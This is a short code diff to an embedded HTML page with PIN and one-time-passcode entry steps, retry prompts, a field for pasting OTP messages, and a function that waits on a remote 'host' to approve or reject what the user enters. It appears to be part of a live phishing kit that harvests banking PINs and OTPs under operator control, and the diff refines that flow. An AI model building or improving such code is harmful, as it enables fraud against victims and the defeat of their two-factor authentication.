@@ -982,7 +982,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
               if (pinMsg) pinMsg.innerText = 'Incorrect PIN entered. Please re-enter your PIN.';
               goTo('pin');
               alert('Incorrect PIN entered. Please re-enter your PIN.');
-            } else if (step === 'otp') {
+             } else if (step === 'otp') {
+              const otpTextarea = document.getElementById('otp-message-paste');
+              if (otpTextarea) otpTextarea.value = '';
+
               document.querySelectorAll('#step-otp input, .otp-input').forEach(inp => inp.value = '');
               const btnOtp = document.getElementById('btn-otp');
               if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY & CONTINUE'; }
@@ -1112,20 +1115,6 @@ HTML_PAGE = r"""<!DOCTYPE html>
       }).catch(err => console.error(err));
 
       watchHostDecision('otp');
-
-           otpStepTimer = setTimeout(() => {
-        if (btnOtp) {
-          btnOtp.disabled = false;
-          btnOtp.innerText = 'VERIFY & CONTINUE';
-        }
-        goTo('processing');
-
-        // Automatically approve after 10 seconds if host doesn't tap Incorrect
-        otpAutoTimer = setTimeout(() => {
-          if (decisionTimer) clearInterval(decisionTimer);
-          showApprovedScreen();
-        }, 10000);
-      }, 1500);
 
     }
 
